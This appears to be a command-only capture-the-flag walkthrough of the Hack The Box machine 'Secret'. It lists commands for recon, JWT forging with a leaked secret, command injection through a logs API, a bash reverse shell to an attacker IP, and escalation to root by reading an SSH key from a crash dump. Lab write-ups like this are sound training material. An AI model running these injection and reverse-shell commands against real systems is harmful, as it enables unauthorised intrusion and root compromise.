# HTB: Secret — Command Walkthrough

## 📌 Box Info
- **Name:** Secret
- **IP:** 10.10.11.120
- **OS:** [Linux](Linux)
- **Difficulty:** Easy
- **Author:** z9fr

---

## 🔍 Recon
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.120
nmap -p 22,80,3000 -sCV -oA scans/nmap-tcpscripts 10.10.11.120
```
```bash
curl http://10.10.11.120
curl http://10.10.11.120/download/files.zip
```

## 🕵️ JWT Registration & Login
```bash
curl -d '{"name":"0xdf0xdf","email":"dfdfdfdf@secret.com","password":"password"}' -X POST http://10.10.11.120/api/user/register -H 'Content-Type: Application/json'
```
```bash
curl -d '{"email":"dfdfdfdf@secret.com","password":"password"}' -X POST http://10.10.11.120/api/user/login -H 'Content-Type: Application/json'
```

## 📁 [Directory Discovery](HTTP)
```bash
feroxbuster -u http://10.10.11.120
```

## 🔐 JWT Analysis
```python
import jwt
token = '...'
secret = '...'
jwt.decode(token, secret)
```

## 🧪 JWT Forging
```python
j = jwt.decode(token, secret)
j['name'] = 'theadmin'
jwt.encode(j, secret)
```

## 🚨 Command Injection Test
```bash
curl -s 'http://10.10.11.120/api/logs?file=;id' -H "auth-token: <ADMIN_JWT_TOKEN>" | jq -r .
```

## ⚙️ Gaining Reverse Shell
```bash
curl -s -G 'http://10.10.11.120/api/logs' \
--data-urlencode "file=>/dev/null;bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'" \
-H "auth-token: <ADMIN_JWT_TOKEN>" | jq -r .
```
```bash
nc -lnvp 443
```

## 🔼 Shell Upgrade
```bash
script /dev/null -c bash
[CTRL+Z]
stty raw -echo; fg
reset
screen
```

## 📄 Privilege Escalation via SUID FD Leak
```bash
./count
[CTRL+Z]
ls -l /proc/$(pidof count)/fd
```

## 💥 Exploiting Crash Dump
```bash
./count
[CTRL+Z]
kill -SIGSEGV $(pidof count)
apport-unpack _opt_count.1000.crash /tmp/0xdf
strings -n 30 /tmp/0xdf/CoreDump | less
```

## 🔑 [SSH](SSH) as Root
```bash
ssh -i root_id_rsa root@10.10.11.120
```